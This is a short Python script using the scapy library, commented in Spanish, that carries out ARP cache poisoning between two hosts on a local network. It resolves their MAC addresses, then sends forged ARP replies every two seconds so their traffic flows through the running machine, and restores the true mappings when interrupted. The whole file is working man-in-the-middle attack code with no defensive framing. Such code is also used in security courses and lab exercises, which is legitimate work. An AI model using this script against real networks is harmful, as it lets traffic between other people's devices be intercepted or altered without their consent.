from scapy.all import *
import time

# obtiene la direccion MAC de una direccion IP
def get_mac(ip_address):
    # op=1 "who_as"
    # hwdst "ff:ff:ff:ff:ff:ff" broadcast
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP.hwsrc]

# restablece la RED 
def restore_network(v1_ip, v1_mac, v2_ip, v2_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=v1_ip, hwsrc=v2_mac, psrc=v2_ip),count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=v2_ip, hwsrc=v1_mac, psrc=v1_ip),count=5)

# envia mensajes cada 2 segundos
def arp_poisoning(v1_ip, v1_mac, v2_ip, v2_mac):
    print("[*] Inicio de envenenamiento ARP [CTRL-C para terminar]")
    try:
        while True:
            # op=2 "is_at"
            # hwsrc default this machine
            send(ARP(op=2, pdst=v1_ip, hwdst=v1_mac, psrc=v2_ip))
            send(ARP(op=2, pdst=v2_ip, hwdst=v2_mac, psrc=v1_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Fin del envenenamiento, restablece la red")    
        restore_network(v1_ip,v1_mac,v2_ip,v2_mac)